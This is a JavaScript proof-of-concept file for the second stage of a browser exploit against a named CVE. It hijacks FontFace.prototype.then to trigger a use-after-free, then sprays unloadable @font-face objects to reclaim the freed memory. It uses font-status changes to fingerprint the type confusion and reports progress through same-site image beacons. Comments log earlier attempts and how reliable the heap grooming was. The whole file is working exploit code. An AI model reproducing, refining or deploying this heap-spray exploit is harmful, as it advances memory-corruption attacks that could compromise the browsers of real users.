// p450 — CVE-2026-43715 Stage 2: unloaded spray + status-flip fingerprint
// Beacon prefix: V450-
//
// p449: groom survives rounds 0-1 always, round 2 sometimes (1/5), dies
// by round 3 — DOM growth makes each offsetHeight allocate competing
// objects that steal the hole. Census always shows t faces "loaded"
// (local(Helvetica) resolves instantly), so a type-confused callback
// landing on a sprayed face leaves no visible trace.
//
// v450 sprays faces that CANNOT load: unicode-range excludes the sink
// character, so every t face sits at "unloaded" forever. Any t face
// flipping to loaded/error after a trigger is the fingerprint of the
// confused fontLoaded() landing on it. Rounds capped at 4 (stability
// window from p449).

(function() {
  function B(tag) {
    try { new Image().src = '/BEACON?V450-' + tag + '&t=' + Date.now(); } catch(e) {}
  }

  B('BOOT');

  window.onerror = function(msg, src, line, col) {
    B('ONERROR-' + encodeURIComponent(String(msg)).slice(0, 100));
    return false;
  };

  var SRC = 'local(Helvetica)';
  var hits = 0;

  Object.defineProperty(FontFace.prototype, 'then', {
    get: function() {
      hits++;
      B('THEN-' + hits);
      var v = document.getElementById('v');
      if (v) {
        v.remove();
        document.body.offsetHeight;      // free happens here

        // Tight spray, p448 recipe, but each face is UNLOADABLE:
        // unicode-range U+10FFFF (private use) never matches 'A'.
        for (var k = 0; k < 120; k++) {
          var fam = 't' + hits + 'x' + k;
          var st = document.createElement('style');
          st.textContent = '@font-face { font-family: ' + fam +
            '; src: ' + SRC + '; unicode-range: U+10FFFF; }';
          document.head.appendChild(st);
          var d = document.createElement('div');
          d.style.fontFamily = fam;
          d.textContent = 'A';
          document.body.appendChild(d);
          document.body.offsetHeight;    // immediate allocation
        }
      }
      return undefined;
    },
    configurable: true
  });
  B('GETTER-SET');

  // Census: counts by status, plus any t face that is NOT unloaded.
  function statCensus(tag) {
    var c = {}, odd = '';
    document.fonts.forEach(function(f) {
      var fam = f.family.replace(/['"]/g, '');
      if (fam[0] === 't' || fam[0] === 'g') {
        var s = f.status;
        c[s] = (c[s] || 0) + 1;
        if (fam[0] === 't' && s !== 'unloaded' && odd.length < 120)
          odd += fam + '=' + s + ' ';
      }
    });
    var parts = [];
    for (var k in c) parts.push(k + ':' + c[k]);
    B(tag + '-STAT[' + parts.join(',') + ']' + (odd ? '-ODD[' + odd + ']' : ''));
  }

  function round(i) {
    var fam = 'g' + i;

    var victim = document.createElement('style');
    victim.id = 'v';
    victim.textContent = 'x{}';
    document.head.appendChild(victim);

    var fs = document.createElement('style');
    fs.textContent = '@font-face { font-family: ' + fam + '; src: ' + SRC + '; }';
    document.head.appendChild(fs);
    document.body.offsetHeight;

    var faces = [];
    document.fonts.forEach(function(f) { faces.push(f); });
    var face = faces.find(function(f) {
      return f.family.replace(/['"]/g, '') === fam;
    });
    if (!face) { B('NOFACE-' + i); return; }

    void face.loaded;
    B('LOAD-' + i);

    face.load().then(
      function() {
        B('SURVIVED-' + i + '-H' + hits);
        statCensus('R' + i);
      },
      function(e) { B('NO-' + i + '-' + encodeURIComponent(String(e)).slice(0, 60)); }
    );
  }

  var i = 0;
  (function step() {
    if (i >= 4) { B('ALLDONE-H' + hits); statCensus('FINAL'); return; }
    round(i); i++;
    setTimeout(step, 500);
  })();

  setTimeout(function() { B('ALIVE-5S-H' + hits); statCensus('T5'); }, 5000);
})();
